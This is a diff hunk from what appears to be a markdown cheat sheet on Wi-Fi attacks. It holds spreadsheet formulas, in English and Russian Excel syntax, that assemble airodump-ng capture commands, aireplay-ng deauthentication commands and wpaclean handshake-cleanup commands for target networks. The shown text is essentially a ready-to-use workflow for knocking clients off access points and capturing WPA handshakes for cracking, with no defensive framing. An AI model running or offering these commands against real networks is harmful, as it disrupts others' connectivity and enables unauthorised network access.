@@ -37,11 +37,11 @@ replace ' ' > ''
 
 ```sh
 x	dump	death	clean
-=VLOOKUP(A3,F:F,1,FALSE)	=CONCATENATE("airodump-ng --bssid ",A3," "," --channel ",D3," "," wlan0 -w ",N3)	=CONCATENATE("aireplay-ng --deauth 10 -a ",A3," ","wlan0")	=CONCATENATE("wpaclean clean_",N3,".cap ",N3,"-01.cap  && ls clea*")
+=VLOOKUP(A3,F:F,1,FALSE)	=CONCATENATE("airodump-ng --bssid ",A3," "," --channel ",D3," "," wlan0 -w ",N3)	=CONCATENATE("aireplay-ng --deauth 10 -a ",A3," ","wlan0")	=CONCATENATE("watch -n 1 wpaclean clean_",N3,".cap ",N3,"-01.cap")
 ```
 ```sh
 x	dump	death	clean
-=ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("wpaclean clean_";N3;".cap ";N3;"-01.cap  && ls clea*")
+=ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap")
 ```
 
 ### Wi-Fi Dumping (wifi_dump.sh)
